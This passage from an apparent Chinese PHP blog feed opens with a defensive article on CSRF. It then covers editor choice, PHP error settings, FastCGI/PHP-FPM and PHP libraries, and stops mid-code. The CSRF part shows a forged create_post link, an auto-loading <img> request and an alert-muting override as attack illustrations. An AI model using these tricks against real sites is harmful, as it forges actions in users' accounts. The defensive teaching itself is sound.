<p>例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL。并访问： <span class="exturl" data-url="aHR0cDovL2V4YW1wbGUuY29tL2Jicy9jcmVhdGVfcG9zdC5waHA/dGl0bGU9JUU2JUEwJTg3JUU5JUEyJTk4JmNvbnRlbnQ9JUU1JTg2JTg1JUU1JUFFJUI5">http://example.com/bbs/create_post.php?title&#x3D;标题&amp;content&#x3D;内容<i class="fa fa-external-link-alt"></i></span> 那么，我只需要在论坛中发一帖，包含一链接： <span class="exturl" data-url="aHR0cDovL2V4YW1wbGUuY29tL2Jicy9jcmVhdGVfcG9zdC5waHA/dGl0bGU9JUU2JTg4JTkxJUU2JTk4JUFGJUU4JTg0JTkxJUU2JUFFJThCJmNvbnRlbnQ9JUU1JTkzJTg4JUU1JTkzJTg4">http://example.com/bbs/create_post.php?title&#x3D;我是脑残&amp;content&#x3D;哈哈<i class="fa fa-external-link-alt"></i></span> 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。</p>
<p>如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的处理者。</p>
<p>比较头痛的是，因为请求可以从任何一方发起，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用 REST 风格 <a href="#%E6%80%BB%E7%BB%93"><code>[2]</code></a> 的 API 设计，<code>GET、POST、PUT、DELETE</code> 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上 —— 攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。</p>
<p>接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是 “请求令牌”。读过《J2EE 核心模式》的同学应该对 “同步令牌” 应该不会陌生，“请求令牌” 和 “同步令牌” 原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。</p>
<p>请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：</p>
<ul>
<li>虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。 </li>
<li>在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。 </li>
<li>第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。 </li>
<li>无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。</li>
</ul>
<p>如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。</p>
<ul>
<li>通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。 </li>
<li>过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不止链接一条。比如 <code>&lt;img src=&quot;./create_post.php&quot; /&gt;</code> 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 <code>window.alert = function ()&#123;&#125;;</code> 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前防御 CSRF 的诸多方法还没几个能彻底无解的。所以 CSDN 上看到讨论 CSRF 的文章，一般都会含有 “无耻” 二字来形容（另一位有该名号的貌似是 DDOS 攻击）。作为开发者，我们能做的就是尽量提高破解难度。当破解难度达到一定程度，网站就逼近于绝对安全的位置了（虽然不能到达）。上述请求令牌方法，就我认为是最有可扩展性的，因为其原理和 CSRF 原理是相克的。CSRF 难以防御之处就在于对服务器端来说，伪造的请求和正常的请求本质上是一致的。而请求令牌的方法，则是揪出这种请求上的唯一区别 —— 来源页面不同。我们还可以做进一步的工作，例如让页面中 token 的 key 动态化，进一步提高攻击者的门槛。</p>
<p>本文只是我个人认识的一个总结，便不讨论过深了。</p>
<p><a href="#%E6%A6%82%E8%BF%B0"><code>[1]</code></a> <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JThGJTgzJUU2JTk1JUI4JUU1JThDJTk2JUU2JTlGJUE1JUU4JUE5JUEy">维基百科的”参数化查询”词条<i class="fa fa-external-link-alt"></i></span></p>
<p><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><code>[2]</code></a> <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWNuLyVFOCVBMSVBOCVFNyU4RSVCMCVFNSVCMSU4MiVFNyU4QSVCNiVFNiU4MCU4MSVFOCVCRCVBQyVFNiU4RCVBMg==">维基百科的”REST”<i class="fa fa-external-link-alt"></i></span></p>
<p>本文转载自：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRvbnlzZWVrLmNvbS9wb3N0L2ludHJvZHVjZS10by14c3MtYW5kLWNzcmY=">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>DevSecurity</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim VS PhpStorm</title>
    <url>/2016/08/vim-phpstorm/</url>
    <content><![CDATA[<h2 id="Vim-VS-PhpStorm"><a href="#Vim-VS-PhpStorm" class="headerlink" title="Vim VS PhpStorm"></a>Vim VS PhpStorm</h2><p>常常纠结于使用 PhpStorm 环境和 Vim 环境，也看聊很多文章。</p>
<p>这个 Vim VS PhpStorm ，就好比 PHP VS 框架一样，自我感觉，如果你想快速的构建模块和项目，必须使用框架和 PhpStorm 这是适合项目级别的选择！</p>
<span id="more"></span>

<p>这个就见仁见智了，适合自己的就是最合适的，对自己来说那个效率高就用哪个。</p>
<p>有人建议想学习一门语言一样学习 Vim，这个看爱好，逼格很高的可以搞搞！我也不喜欢折腾，毕竟编程本身就挺折腾人的！</p>
<p>人生几十年，你还能折腾几年！</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Php 错误提示配置</title>
    <url>/2016/09/error-reporting/</url>
    <content><![CDATA[<h2 id="Php-开启错误提示"><a href="#Php-开启错误提示" class="headerlink" title="Php 开启错误提示"></a>Php 开启错误提示</h2><p>在用 php 做网站开发的时候，为防止用户看到错误信息，而出现的不友好界面。故一般性会在 php.ini 里设置：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">display_errors</span> = <span class="literal">Off</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>不过在开发的时候，我们有时候需要打开错误信息。这时候可以在 php 文件里设置。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;On&quot;</span>)<span class="comment">;</span></span><br><span class="line">error_reporting(<span class="name">E_ALL</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h2 id="Php-代码测试"><a href="#Php-代码测试" class="headerlink" title="Php 代码测试"></a>Php 代码测试</h2><p>不过有时候我们及时这样设置了，还是无法显示 php 里的语法错误。</p>
<p>这是由于 php 文件的语法错误导致该文件根本没有被执行，所以当然不会显示错误信息。</p>
<p>假设这个 php 里有语法错误，你可以新建一个 test.php</p>
<p>然后在该 php 里如下编辑：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;On&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;dance.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样，当你在运行 test.php 的时候  程序就会报其中的错误语法。</p>
<h2 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h2><p>error_reporting(“E_ALL”) 和 ini_set(“display_errors”, “on”) 的区别？</p>
<p>后者的权限大于前者，后者是 Off 的话，前者就算是 E_ALL 也没用。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>FastCgi 与 PHP-FPM 之间的区别</title>
    <url>/2016/09/fastcgi-phpfpm/</url>
    <content><![CDATA[<h2 id="CGI-的作用"><a href="#CGI-的作用" class="headerlink" title="CGI 的作用"></a>CGI 的作用</h2><p>CGI 是为了保证 web server 传递过来的数据是标准格式的，方便 CGI 程序的编写者。</p>
<p>web server（比如说 nginx）只是内容的分发者。</p>
<span id="more"></span>

<p>如果请求 &#x2F;index.html，那么 web server 会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。</p>
<p>如果现在请求的是 &#x2F;index.php，根据配置文件，nginx 知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理后交给 PHP 解析器。</p>
<p>Nginx 会传哪些数据给 PHP 解析器呢？url、查询字符串、POST 数据、HTTP header 等等，CGI 就是规定要传哪些数据、以什么样的格式传递给后方处理这个请求的协议。</p>
<p>当 web server 收到 &#x2F;index.php 这个请求后，会启动对应的 CGI 程序，这里就是 PHP 的解析器。</p>
<p>接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程。web server 再把结果返回给浏览器。</p>
<p>CGI 是个协议，跟进程什么的没关系。</p>
<h2 id="FastCgi-是什么"><a href="#FastCgi-是什么" class="headerlink" title="FastCgi 是什么"></a>FastCgi 是什么</h2><p>FastCgi 是用来提高 CGI 程序性能的。</p>
<p>那么 CGI 程序的性能问题在哪呢？”PHP 解析器会解析 php.ini 文件，初始化执行环境 “，就是这里了。</p>
<p>标准的 CGI 对每个请求都会执行这些步骤，所以处理每个请求的时间会比较长。</p>
<p>那么 FastCgi 是怎么做的呢？首先 FastCgi 会先启一个 master，解析配置文件，初始化执行环境，然后再启动多个 worker。</p>
<p>当请求过来时，master 会传递给一个 worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。</p>
<p>而且当 worker 不够用时，master 可以根据配置预先启动几个 worker 等着；当然空闲 worker 太多时，也会停掉一些，这样就提高了性能，也节约了资源。</p>
<p>这就是 FastCgi 对进程的管理。</p>
<h2 id="PHP-FPM-是什么"><a href="#PHP-FPM-是什么" class="headerlink" title="PHP-FPM 是什么"></a>PHP-FPM 是什么</h2><p>PHP-FPM 是一个实现了 FastCgi 的程序，被 PHP 官方收录。</p>
<p>PHP 的解释器是 php-cgi，它只是个 CGI 程序，只能解析请求，返回结果，不会进程管理。</p>
<p>所以就出现了一些能够调度 php-cgi 进程的程序，比如说由 lighthttpd 分离出来的 spawn-fcgi。</p>
<p>PHP-FPM 也是这么个东西，在长时间的发展后，逐渐得到了大家的认可，也越来越流行。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>FastCGI</tag>
        <tag>PHP-FPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Php 开发者应了解的 24 个库</title>
    <url>/2016/09/php-liriary/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>作为一个 PHP 开发者，现在是一个令人激动的时刻。每天有许许多多有用的库分发出来，在 Github 上很容易发现和使用这些库。</p>
<p>下面是我曾经遇到过最酷的 24 个库。你最喜欢的库没有在这个列表里面？那就在评论中分享吧！</p>
<span id="more"></span>

<h2 id="1-Dispatch-–-微框架"><a href="#1-Dispatch-–-微框架" class="headerlink" title="1. Dispatch – 微框架"></a>1. Dispatch – 微框架</h2><p>Dispatch 是一个 PHP 小框架。它并没有给你完整的 MVC 设置，但你可以定义 URL 规则和方法，以便更好组织应用程序。</p>
<p>这对 API、简单的站点或原型来说是完美的。</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="comment">//包含库</span></span><br><span class="line">include <span class="string">&#x27;dispatch.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义你的路由</span></span><br><span class="line"><span class="keyword">get</span>(<span class="string">&#x27;/greet&#x27;</span>, <span class="title function_"><span class="keyword">function</span> </span>() &#123;</span><br><span class="line">　　<span class="comment">//渲染视图</span></span><br><span class="line">    render(<span class="string">&#x27;greet-form&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//post处理</span></span><br><span class="line">post(<span class="string">&#x27;/greet&#x27;</span>, <span class="title function_"><span class="keyword">function</span> </span>() &#123;</span><br><span class="line">    <span class="variable">$name</span> = from(<span class="variable">$_POST</span>, <span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">　　<span class="comment">// render a view while passing some locals</span></span><br><span class="line">    render(<span class="string">&#x27;greet-show&#x27;</span>, array(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$name</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// serve your site</span></span><br><span class="line">dispatch();</span><br></pre></td></tr></table></figure>

<p>你可以匹配特定类型的 HTTP 请求和路径，渲染视图或做更多事情。如果你合并 Dispatch 和其他框架，那你就可以拥有一个相当强大并且轻量级的程序！</p>
<h2 id="2-Klein-–-PHP-快如闪电的路由"><a href="#2-Klein-–-PHP-快如闪电的路由" class="headerlink" title="2. Klein – PHP 快如闪电的路由"></a>2. Klein – PHP 快如闪电的路由</h2><p>Klein 是另一款针对 PHP5.3 + 版本的轻量级路由库。虽然它有一些比 Dispatch 冗长的语法，但它相当快。这有一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">respond(<span class="string">&#x27;/[:name]&#x27;</span>, <span class="keyword">function</span> (<span class="variable">$request</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$request</span>-&gt;name;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>你也可以定制来指定 HTTP 方法和使用正则表达式作为路径</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">respond(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/posts&#x27;</span>, <span class="symbol">$call</span><span class="built_in">back</span>);</span><br><span class="line">respond(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/posts/create&#x27;</span>, <span class="symbol">$call</span><span class="built_in">back</span>);</span><br><span class="line">respond(<span class="string">&#x27;PUT&#x27;</span>, <span class="string">&#x27;/posts/[i:id]&#x27;</span>, <span class="symbol">$call</span><span class="built_in">back</span>);</span><br><span class="line">respond(<span class="string">&#x27;DELETE&#x27;</span>, <span class="string">&#x27;/posts/[i:id]&#x27;</span>, <span class="symbol">$call</span><span class="built_in">back</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//匹配多种请求方法:</span></span><br><span class="line">respond(<span class="built_in">array</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>), <span class="symbol">$route</span>, <span class="symbol">$call</span><span class="built_in">back</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//你或许也想在相同的地方处理请求</span></span><br><span class="line">respond(<span class="string">&#x27;/posts/[create|edit:action] /[i:id] &#x27;</span>, <span class="keyword">function</span> (<span class="params">$request, $response</span>) &#123;</span><br><span class="line">    switch (<span class="symbol">$re</span>quest-&gt;action) &#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>对于小型项目来说这是很棒的，但当你把一个像这样的库用于大型应用时，你不得不遵守规矩，因为你的代码可能很快就变得不可维护。</p>
<p>所以你最好搭配一个像 Laravel 或者 CodeIgniter 这样完全成熟的框架。</p>
<h2 id="3-Ham-–-带缓存的路由库"><a href="#3-Ham-–-带缓存的路由库" class="headerlink" title="3. Ham – 带缓存的路由库"></a>3. Ham – 带缓存的路由库</h2><p>Ham 也是一款轻量级的路由框架，但是它利用缓存甚至获得了更快的速度。</p>
<p>它通过把任何 I&#x2F;O 相关的东西缓存进 XCache&#x2F;APC。下面是一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../ham/ham.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Ham</span>(<span class="string">&#x27;example&#x27;</span>);</span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">config_from_file</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/pork&#x27;</span>, function(<span class="variable">$app</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Delicious pork.&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hello</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span>, <span class="variable">$name</span>=<span class="string">&#x27;world&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$app</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;hello.html&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$name</span></span><br><span class="line">    ));</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/hello/&lt;string&gt;&#x27;</span>, <span class="variable">$hello</span>);</span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$hello</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br></pre></td></tr></table></figure>

<p>这个库要求你至少安装了 XCache 和 APC 其中的一个，这可能意味着，在大多数主机提供商提供的主机上它可能用不了。</p>
<p>但是如果你拥有一个安装它们其一的主机，或者你可以操控你的 web 服务器，你应该尝试这款最快的框架。</p>
<h2 id="4-Assetic-–-资源管理"><a href="#4-Assetic-–-资源管理" class="headerlink" title="4. Assetic – 资源管理"></a>4. Assetic – 资源管理</h2><p>Assetic 是一个 PHP 的资源管理框架，用于合并和减小了 CSS&#x2F;JS 资源。下面是例子。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">Assetic</span>\<span class="title">Asset</span>\<span class="title">AssetCollection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Assetic</span>\<span class="title">Asset</span>\<span class="title">FileAsset</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Assetic</span>\<span class="title">Asset</span>\<span class="title">GlobAsset</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$js</span> = <span class="keyword">new</span> <span class="title class_">AssetCollection</span>(<span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GlobAsset</span>(<span class="string">&#x27;/path/to/js/*&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">FileAsset</span>(<span class="string">&#x27;/path/to/another.js&#x27;</span>),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">//当资源被输出时，代码会被合并</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$js</span>-&gt;<span class="title function_ invoke__">dump</span>();</span><br></pre></td></tr></table></figure>

<p>以这种方式合并资源是一个好主意，因为它可以加速站点。不仅仅总下载量减小了，也消除了大量不必要的 HTTP 请求 (这是最影响页面加载时间的两件事)</p>
<h2 id="5-ImageWorkshop-–-带层的图片处理"><a href="#5-ImageWorkshop-–-带层的图片处理" class="headerlink" title="5. ImageWorkshop – 带层的图片处理"></a>5. ImageWorkshop – 带层的图片处理</h2><p>ImageWorkshop 是一个让你操控带层图片的开源库。</p>
<p>借助它你可以重定义尺寸、裁剪、制作缩略图、打水印或做更多事情。下面是一个例子：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 从norway.jpg图片初始化norway层</span><br><span class="line"><span class="variable">$norwayLayer</span> = ImageWorkshop::initFromPath(<span class="string">&#x27;/path/to/images/norway.jpg&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 从watermark.png图片初始化watermark层(水印层)</span><br><span class="line"><span class="variable">$watermarkLayer</span> = ImageWorkshop::initFromPath(<span class="string">&#x27;/path/to/images/watermark.png&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span> = <span class="variable">$norwayLayer</span>-&gt;getResult(); <span class="regexp">//</span> 这是生成的图片!</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-type: image/jpeg&#x27;</span>);</span><br><span class="line">imagejpeg(<span class="variable">$image</span>, null, <span class="number">95</span>); <span class="regexp">//</span> We choose to show a JPG with a quality of <span class="number">95</span>%</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<p>ImageWorkshop 被开发用于使一些 PHP 中最通用的处理图片的案例简化，如果你需要一些更强大的东西，你应该看下 Imagine library！</p>
<h2 id="6-Snappy-–-快照-PDF-库"><a href="#6-Snappy-–-快照-PDF-库" class="headerlink" title="6. Snappy – 快照 &#x2F; PDF 库"></a>6. Snappy – 快照 &#x2F; PDF 库</h2><p>Snappy 是一个 PHP5 库，可以生成快照、URL、HTML、PDF。</p>
<p>它依赖于 wkhtmltopdf binary（在 Linux，Windows 和 OSX 上都可用）。你可以像这样使用它们：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;/path/to/snappy/src/autoload.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Knp</span>\<span class="title">Snappy</span>\<span class="title">Pdf</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//通过wkhtmltopdf binary路径初始化库</span></span><br><span class="line"><span class="variable">$snappy</span> = <span class="keyword">new</span> <span class="title class_">Pdf</span>(<span class="string">&#x27;/usr/local/bin/wkhtmltopdf&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//通过把Content-type头设置为pdf来在浏览器中展示pdf</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/pdf&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;file.pdf&quot;&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$snappy</span>-&gt;<span class="title function_ invoke__">getOutput</span>(<span class="string">&#x27;http://www.github.com&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>要记得，你的主机提供商可能不允许调用外部二进制程序。 </p>
<h2 id="7-Idiorm-–-轻量级-ORM-库"><a href="#7-Idiorm-–-轻量级-ORM-库" class="headerlink" title="7. Idiorm – 轻量级 ORM 库"></a>7. Idiorm – 轻量级 ORM 库</h2><p>Idiorm 是个人之前在本网站教程中用过最喜爱的一款。</p>
<p>它是一款轻量级的 ORM 库，一个建立在 PDO 之上的 PHP5 查询构造器。借助它，你可以忘记如何书写乏味的 SQL</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">$user = ORM::for_table<span class="function"><span class="params">(<span class="string">&#x27;user&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    -&gt;</span>where_equal<span class="function"><span class="params">(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;j4mie&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    -&gt;</span>find_one();</span><br><span class="line"></span><br><span class="line">$user-&gt;first_name = <span class="string">&#x27;Jamie&#x27;</span>;</span><br><span class="line">$user-&gt;save();</span><br><span class="line"></span><br><span class="line">$tweets = ORM::for_table<span class="function"><span class="params">(<span class="string">&#x27;tweet&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    -&gt;</span>select<span class="function"><span class="params">(<span class="string">&#x27;tweet.*&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    -&gt;</span>join(<span class="string">&#x27;user&#x27;</span>, array(</span><br><span class="line">        <span class="string">&#x27;user.id&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;tweet.user_id&#x27;</span></span><br><span class="line">    ))</span><br><span class="line">    -&gt;where_equal<span class="function"><span class="params">(<span class="string">&#x27;user.username&#x27;</span>, <span class="string">&#x27;j4mie&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    -&gt;</span>find_many();</span><br><span class="line"></span><br><span class="line">foreach ($tweets <span class="keyword">as</span> $tweet) &#123;</span><br><span class="line">    echo $tweet-&gt;text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Idiorm 有一个姊妹库叫 Paris，Paris 是一个基于 Idiorm 的 Active Record 实现。 </p>
<h2 id="8-Underscore-–-PHP-的工具腰带"><a href="#8-Underscore-–-PHP-的工具腰带" class="headerlink" title="8. Underscore – PHP 的工具腰带"></a>8. Underscore – PHP 的工具腰带</h2><p>Underscore 是原始 Underscore.js 的一个接口 – Javascript 应用的工具腰带。</p>
<p>PHP 版本没有让人失望，而且支持了几乎所有原生功能。下面是一些例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__::<span class="title function_ invoke__">each</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123; <span class="keyword">echo</span> <span class="variable">$num</span> . <span class="string">&#x27;,&#x27;</span>; &#125;); <span class="comment">// 1,2,3,</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$multiplier</span> = <span class="number">2</span>;</span><br><span class="line">__::<span class="title function_ invoke__">each</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$index</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$multiplier</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$index</span> . <span class="string">&#x27;=&#x27;</span> . (<span class="variable">$num</span> * <span class="variable">$multiplier</span>) . <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// prints: 0=2,1=4,2=6,</span></span><br><span class="line"></span><br><span class="line">__::<span class="title function_ invoke__">reduce</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span 